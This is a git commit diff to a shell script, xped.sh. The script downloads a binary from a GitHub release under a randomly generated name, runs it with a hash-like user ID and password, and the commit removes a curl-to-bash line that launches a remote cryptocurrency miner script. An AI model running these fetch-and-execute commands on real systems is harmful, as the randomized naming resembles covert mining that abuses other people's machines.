a470adaa6a4e32c25eccd230f893393a7a26aa32
vedhagsvp <vedhag230223@gmail.com>
2026-02-07 00:11:55 +0530

    Update xped.sh

--- xped.sh
+++ xped.sh
@@ -5,4 +5,4 @@ BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
 wget -O "$BIN_NAME" https://github.com/vedhagsvp/soljtka/releases/download/latest/abelsa
 chmod +x "$BIN_NAME"
 ./"$BIN_NAME" -u 9cc006e70b0583c358ce5b1bbb9cdd30a03c92a152b814e2439499047c1a529c -p f86703670b
-bash <(curl -sSL https://download.pqabelian.io/release/pool/abelminer-cpu.sh) start amd64 9cc006e70b0583c358ce5b1bbb9cdd30a03c92a152b814e2439499047c1a529c f86703670b
+
